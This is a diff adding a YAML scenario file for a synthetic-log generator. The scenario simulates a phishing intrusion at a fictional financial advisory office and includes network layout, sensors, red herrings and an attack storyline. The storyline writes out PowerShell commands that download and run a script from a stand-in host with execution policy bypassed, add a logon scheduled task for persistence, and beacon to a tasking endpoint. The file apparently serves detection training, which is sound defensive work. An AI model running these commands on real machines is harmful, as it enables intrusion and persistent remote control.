@@ -1,0 +1,465 @@
+name: cedar-vale-invoice-phishing
+description: Trace an invoice lure through mailbox access, a downloaded script, scheduled-task persistence
+  and JSON tasking traffic.
+status: published
+
+publisher: evidenceforge
+parents:
+- kind: scenario
+  publisher: evidenceforge
+  name: cedar-vale-invoice-phishing
+  version: 1.0.0
+  digest: 1a7d19a65a8ed3d2b560141b07f6f24336de048d8f1d039dc67ce17fb606f48b
+- kind: scenario
+  publisher: evidenceforge
+  name: cedar-vale-invoice-phishing
+  draft_id: 44796644-0ab7-4638-a09b-b01ee284a990
+  digest: 797e96f8f7aa9a712d7ce1bb776c411103a69db1c43b04df7bcdca23a0fa5263
+display_name: Cedar Vale Advisory - Invoice Phishing
+schema_version: '3.0'
+composition:
+  industries:
+  - source: path
+    publisher: evidenceforge
+    name: finance
+    version: 1.0.0
+    path: ../dependencies/evidenceforge/industry/finance/1.0.0
+environment:
+  description: Cedar Vale Advisory, a fictional six-person financial advisory office.
+  domain: cedarvale.example
+  timezone:
+    default: America/New_York
+  users:
+  - username: nina.torres
+    full_name: Nina Torres
+    email: nina.torres@cedarvale.example
+    persona: evidenceforge/finance:finance_operations
+    primary_system: CVA-WS-01
+    groups:
+    - Finance
+  - username: evan.brooks
+    full_name: Evan Brooks
+    email: evan.brooks@cedarvale.example
+    persona: evidenceforge/finance:finance_operations
+    primary_system: CVA-WS-02
+    groups:
+    - Finance
+  - username: priya.shah
+    full_name: Priya Shah
+    email: priya.shah@cedarvale.example
+    persona: evidenceforge/finance:finance_operations
+    primary_system: CVA-WS-03
+    groups:
+    - Finance
+  - username: marcus.reed
+    full_name: Marcus Reed
+    email: marcus.reed@cedarvale.example
+    persona: evidenceforge/finance:finance_operations
+    primary_system: CVA-WS-04
+    groups:
+    - Finance
+  - username: lena.ortiz
+    full_name: Lena Ortiz
+    email: lena.ortiz@cedarvale.example
+    persona: executive
+    primary_system: CVA-WS-05
+    groups:
+    - Finance
+  - username: caleb.stone
+    full_name: Caleb Stone
+    email: caleb.stone@cedarvale.example
+    persona: sysadmin
+    primary_system: CVA-WS-06
+    groups:
+    - IT-Operations
+  systems:
+  - hostname: CVA-WS-01
+    ip: 10.61.10.21
+    os: Windows 11
+    roles:
+    - workstation
+    type: workstation
+    services: []
+    assigned_user: nina.torres
+  - hostname: CVA-WS-02
+    ip: 10.61.10.22
+    os: Windows 11
+    roles:
+    - workstation
+    type: workstation
+    services: []
+    assigned_user: evan.brooks
+  - hostname: CVA-WS-03
+    ip: 10.61.10.23
+    os: Windows 11
+    roles:
+    - workstation
+    type: workstation
+    services: []
+    assigned_user: priya.shah
+  - hostname: CVA-WS-04
+    ip: 10.61.10.24
+    os: Windows 11
+    roles:
+    - workstation
+    type: workstation
+    services: []
+    assigned_user: marcus.reed
+  - hostname: CVA-WS-05
+    ip: 10.61.10.25
+    os: Windows 11
+    roles:
+    - workstation
+    type: workstation
+    services: []
+    assigned_user: lena.ortiz
+  - hostname: CVA-WS-06
+    ip: 10.61.10.26
+    os: Windows 11
+    roles:
+    - workstation
+    type: workstation
+    services: []
+    assigned_user: caleb.stone
+  - hostname: CVA-DC-01
+    ip: 10.61.20.10
+    os: Windows Server 2022
+    roles:
+    - domain_controller
+    - dns_server
+    type: domain_controller
+    services:
+    - DNS
+    - Kerberos
+    - LDAP
+  - hostname: CVA-MAIL-01
+    ip: 10.61.20.20
+    os: Linux Ubuntu 24.04
+    roles:
+    - mail_server
+    type: server
+    services:
+    - Postfix
+    - Dovecot
+  groups:
+  - name: Finance
+    members:
+    - nina.torres
+    - evan.brooks
+    - priya.shah
+    - marcus.reed
+    - lena.ortiz
+  - name: IT-Operations
+    members:
+    - caleb.stone
+  network:
+    segments:
+    - name: office
+      cidr: 10.61.10.0/24
+      exposure: internal
+    - name: servers
+      cidr: 10.61.20.0/24
+      exposure: internal
+    - name: core-edge-transit
+      cidr: 10.61.254.0/30
+      exposure: internal
+      description: Point-to-point link between the core router and edge firewall.
+    routing:
+      devices:
+        cedar-core: {kind: router}
+        cedar-edge-fw: {kind: firewall, firewall: cedar-edge-fw}
+      links:
+        office-access:
+          segment: office
+          interfaces:
+            cedar-core: {name: office, ip: 10.61.10.1}
+        server-access:
+          segment: servers
+          interfaces:
+            cedar-core: {name: servers, ip: 10.61.20.1}
+        core-edge-transit:
+          segment: core-edge-transit
+          interfaces:
+            cedar-core: {name: edge, ip: 10.61.254.2}
+            cedar-edge-fw: {name: inside, ip: 10.61.254.1}
+        internet-uplink:
+          internet: true
+          interfaces:
+            cedar-edge-fw: {name: outside, ip: 203.0.113.10}
+      gateways:
+        office: cedar-core
+        servers: cedar-core
+      routes:
+        cedar-core:
+        - {destination: 0.0.0.0/0, next_hop: 10.61.254.1}
+        cedar-edge-fw:
+        - {destination: 10.61.10.0/24, next_hop: 10.61.254.2}
+        - {destination: 10.61.20.0/24, next_hop: 10.61.254.2}
+        - {destination: 0.0.0.0/0, internet_link: internet-uplink}
+    sensors:
+    - type: network
+      name: cedar-office-zeek
+      placement: tap
+      link_tap: {link: office-access}
+      log_formats:
+      - zeek
+    - type: network
+      name: cedar-transit-zeek
+      placement: tap
+      link_tap: {link: core-edge-transit}
+      log_formats: [zeek]
+    - type: ids
+      name: cedar-transit-ids
+      placement: tap
+      link_tap: {link: core-edge-transit}
+      log_formats: [snort_alert]
+    - type: firewall
+      name: cedar-edge-fw
+      placement: tap
+      monitoring_segments: [core-edge-transit]
+      log_formats: [cisco_asa]
+      interfaces: {office: inside, servers: inside, core-edge-transit: inside}
+      default_action: deny
+      deny_ratio: 0
+      policy:
+      - {src: external, dst: 10.61.20.20, ports: [25], action: permit}
+      - {src: 10.61.20.20, dst: external, ports: [25], action: permit}
+      - {src: office, dst: external, ports: [80, 443], action: permit}
+      - {src: servers, dst: external, ports: [53, 80, 123, 443], action: permit}
+      nat_rules:
+      - type: static
+        real_ip: 10.61.20.20
+        mapped_ip: 203.0.113.25
+      - type: dynamic_pat
+        src: [office, servers]
+        mapped_ip: 203.0.113.10
+    public_cidrs: [203.0.113.25/32]
+  network_identities:
+  - id: vendor-documents
+    hosts:
+    - documents.harbor-invoices.example
+    ips:
+    - 198.51.100.61
+    tags: []
+    dns: true
+  - id: status-api
+    hosts:
+    - api.ledger-status.example
+    ips:
+    - 198.51.100.62
+    tags: []
+    dns: true
+  - id: regular-supplier
+    hosts:
+    - mail.harbor-supply.example
+    ips:
+    - 192.0.2.61
+    tags: []
+    dns: true
+  email:
+    accepted_domains:
+    - cedarvale.example
+    mail_servers:
+    - name: primary
+      hostname: mail.cedarvale.example
+      system: CVA-MAIL-01
+      platform: generic_smtp
+      allow_inbound_starttls: true
+      attempt_outbound_starttls: true
+    default_mailbox_servers:
+    - primary
+    outbound_routes:
+    - name: default
+      servers:
+      - primary
+    inbound_route:
+    - primary
+    artifacts:
+      mode: all
+    background_messages_per_user_per_day: 8
+    corpus: email/corpus.yaml
+time_window:
+  start: '2026-11-09T14:00:00Z'
+  duration: 8h
+  warmup: 1h
+baseline_activity:
+  description: Normal business activity mixed with routine administration.
+  intensity: medium
+  variation: high
+  suspicious_noise: low
+output:
+  logs:
+  - format: windows
+  - format: zeek
+  - format: ecar
+  - format: syslog
+  - format: snort_alert
+  - format: cisco_asa
+  destination: ./output
+  compression: false
+release_notes: Model authored routing with a core router and an edge Cisco ASA firewall
+  that publishes the mail server through static NAT. Replace the core SPAN with an
+  office-link Zeek TAP and Zeek and Snort TAPs on the core-to-firewall link, and add
+  firewall and IDS logs.
+generation_seed: 6101
+observation_profile: complete
+storyline:
+- id: invoice-delivery
+  time: +1h
+  actor: nina.torres
+  system: CVA-WS-01
+  activity: A supplier-themed message arrives in Nina's mailbox.
+  events:
+  - type: email_message
+    sender: billing@harbor-invoices.example
+    to:
+    - nina.torres@cedarvale.example
+    corpus_id: invoice-review
+    artifact_id: cva-invoice-1048
+    verdict: phishing
+    technique: T1566.002
+- id: mailbox-access
+  time: +1h12m
+  actor: nina.torres
+  system: CVA-WS-01
+  activity: Nina opens her mailbox over encrypted IMAP.
+  events:
+  - type: logon
+    logon_type: 2
+    description: User-session context preceding the lure interaction.
+  - type: email_read
+    server: primary
+    protocol: imaps
+    message_ids:
+    - cva-invoice-1048
+    count: 3
+    duration: 43.0
+- id: portal-open
+  time: +1h15m
+  actor: nina.torres
+  system: CVA-WS-01
+  activity: A browser opens the supplier-themed document page.
+  events:
+  - type: process
+    process_name: C:\Program Files\Google\Chrome\Application\chrome.exe
+    command_line: '"C:\Program Files\Google\Chrome\Application\chrome.exe" http://documents.harbor-invoices.example/review/november'
+    process_ref: invoice-browser
+  - type: connection
+    dst_ip: 198.51.100.61
+    dst_port: 80
+    service: http
+    hostname: documents.harbor-invoices.example
+    method: GET
+    uri: /review/november
+    status_code: 200
+    response_body_len: 4620
+- id: helper-download
+  time: +1h17m
+  actor: nina.torres
+  system: CVA-WS-01
+  activity: A PowerShell download saves the offered reconciliation script.
+  events:
+  - type: process
+    process_name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    command_line: powershell.exe -NoProfile -Command "Invoke-WebRequest -Uri http://documents.harbor-invoices.example/assets/statement-viewer.ps1
+      -OutFile C:\Users\nina.torres\Downloads\statement-viewer.ps1"
+    process_ref: helper-download
+  - type: connection
+    dst_ip: 198.51.100.61
+    dst_port: 80
+    service: http
+    hostname: documents.harbor-invoices.example
+    method: GET
+    uri: /assets/statement-viewer.ps1
+    status_code: 200
+    response_body_len: 7168
+- id: helper-execution
+  time: +1h20m
+  actor: nina.torres
+  system: CVA-WS-01
+  activity: Nina runs the offered script, establishing the user-context foothold.
+  events:
+  - type: process
+    process_name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    command_line: powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Users\nina.torres\Downloads\statement-viewer.ps1
+    process_ref: viewer-agent
+- id: scheduled-persistence
+  time: +1h23m
+  actor: nina.torres
+  system: CVA-WS-01
+  activity: The script registers a per-user logon task to rerun itself.
+  events:
+  - type: process
+    process_name: C:\Windows\System32\schtasks.exe
+    command_line: schtasks.exe /Create /TN "LedgerUpdateCheck" /SC ONLOGON /TR "powershell.exe -NoProfile
+      -File C:\Users\nina.torres\Downloads\statement-viewer.ps1" /F
+    parent_ref: viewer-agent
+- id: tasking-worker
+  time: +1h25m
+  actor: nina.torres
+  system: CVA-WS-01
+  activity: The bootstrap script starts its polling worker after task registration.
+  events:
+  - type: process
+    process_name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    command_line: powershell.exe -NoProfile -File C:\Users\nina.torres\Downloads\statement-viewer.ps1
+      -Mode Poll
+    parent_ref: viewer-agent
+    process_ref: tasking-worker
+- id: json-tasking
+  time: +1h26m
+  actor: nina.torres
+  system: CVA-WS-01
+  activity: The foothold polls a JSON tasking endpoint with variable intervals.
+  events:
+  - type: beacon
+    dst_ip: 198.51.100.62
+    dst_port: 80
+    hostname: api.ledger-status.example
+    service: http
+    profile: json_tasking
+    interval: 95s
+    duration: 48m
+    jitter: 0.28
+- id: invoice-follow-up
+  time: +2h30m
+  actor: nina.torres
+  system: CVA-WS-01
+  activity: The sender follows up on the earlier invoice message.
+  events:
+  - type: email_message
+    sender: billing@harbor-invoices.example
+    to:
+    - nina.torres@cedarvale.example
+    corpus_id: phish-reminder
+    artifact_id: cva-invoice-reminder
+    verdict: phishing
+red_herrings:
+- id: inventory-task
+  time: +3h
+  actor: caleb.stone
+  system: CVA-WS-06
+  activity: IT runs its ordinary inventory task.
+  events:
+  - type: process
+    process_name: C:\Windows\System32\schtasks.exe
+    command_line: schtasks.exe /Run /TN "DeviceInventory"
+  explanation: Approved inventory work on the IT workstation; distinguish its host, operator and task
+    name from the invoice chain.
+- id: ordinary-supplier-mail
+  time: +45m
+  actor: evan.brooks
+  system: CVA-WS-02
+  activity: An ordinary supplier receipt reaches another mailbox.
+  events:
+  - type: email_message
+    sender: accounts@harbor-supply.example
+    to:
+    - evan.brooks@cedarvale.example
+    corpus_id: supplier-receipt
+    artifact_id: cva-receipt-benign
+  explanation: A legitimate supplier message has a similarly themed subject but different sender identity,
+    recipient and receipt content.
+
+configuration_context: ../configuration/context.yaml
+scenario_version: 1.1.0
